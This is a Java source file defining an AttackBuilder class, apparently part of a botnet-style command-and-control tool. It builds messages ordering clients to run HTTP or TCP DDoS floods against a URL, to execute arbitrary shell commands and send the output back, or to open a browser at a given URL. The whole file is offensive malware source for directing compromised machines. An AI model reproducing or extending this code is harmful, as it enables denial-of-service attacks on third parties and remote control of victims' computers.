package builder;

import model.GenericMessage;
import model.SimplePair;
import model.constant.AttackType;

/**
 * @Author: Douglas A. Giovanella
 * @Email: douglas_giovanella@hotmail.com
 * @Date: 28/07/2018
 */
public class AttackBuilder {

    public static DDOSAttackBuilder buildDDOSAttack() {
        return new AttackBuilder().new DDOSAttackBuilder();
    }

    public static BrowserOpeningBuilder buildBrowserOpening() {
        return new AttackBuilder().new BrowserOpeningBuilder();
    }

    public static CommandLineBuilder buildCommandLineExecuter() {
        return new AttackBuilder().new CommandLineBuilder();
    }

    public class CommandLineBuilder {

        private String mCommand;

        private boolean mClientShouldSendResponse = false;

        public CommandLineBuilder clientShouldSendResponse(boolean bool) {
            mClientShouldSendResponse = bool;
            return this;
        }

        public CommandLineBuilder withCommand(String command) {
            mCommand = command;
            return this;
        }

        public GenericMessage build() {
            try {
                if (mCommand == null) {
                    throw new MissingArgumentException("Command ");
                }
                return GenericMessage.createAttackMessage(AttackType.COMMAND_LINE, mCommand, mClientShouldSendResponse);
            } catch (MissingArgumentException e) {
                e.printStackTrace();
            }
            return GenericMessage.createAttackMessage(AttackType.COMMAND_LINE, "", mClientShouldSendResponse);
        }
    }

    public class BrowserOpeningBuilder {

        private String mURL;

        private boolean mClientShouldSendResponse = false;

        public BrowserOpeningBuilder clientShouldSendResponse(boolean bool) {
            mClientShouldSendResponse = bool;
            return this;
        }

        public BrowserOpeningBuilder withURL(String url) {
            mURL = url;
            return this;
        }

        public GenericMessage build() {

            try {
                if (mURL == null) {
                    throw new MissingArgumentException("URL to open");
                }
                return GenericMessage.createAttackMessage(AttackType.BROWSE_URL, mURL, mClientShouldSendResponse);
            } catch (MissingArgumentException e) {
                e.printStackTrace();
            }

            return GenericMessage.createAttackMessage(AttackType.BROWSE_URL, "", mClientShouldSendResponse);
        }
    }

    public class DDOSAttackBuilder {

        private String mUrl;

        private Integer mQuantity;

        private boolean mClientShouldSendResponse = false;

        public DDOSAttackBuilder clientShouldSendResponse(boolean bool) {
            mClientShouldSendResponse = bool;
            return this;
        }

        public DDOSAttackBuilder withUrl(String url) {
            mUrl = url;
            return this;
        }

        public DDOSAttackBuilder withQuantity(int quantity) {
            mQuantity = quantity;
            return this;
        }

        private GenericMessage build(AttackType type) {
            try {

                if (mUrl == null) {
                    throw new MissingArgumentException("Attack URL");
                }

                if (mQuantity == null) {
                    throw new MissingArgumentException("Quantity of attack");
                }

                return GenericMessage.createAttackMessage(type, new SimplePair<>(mUrl, mQuantity), mClientShouldSendResponse);
            } catch (MissingArgumentException e) {
                e.printStackTrace();
            }
            return GenericMessage.createAttackMessage(type, new SimplePair<>("", 0), mClientShouldSendResponse);
        }

        public GenericMessage buildHTTP() {
            return build(AttackType.HTTP);
        }

        public GenericMessage buildTCP() {
            return build(AttackType.TCP);
        }
    }

    private class MissingArgumentException extends Exception {
        MissingArgumentException(String message) {
            super(message + " not defined!");
        }
    }

}
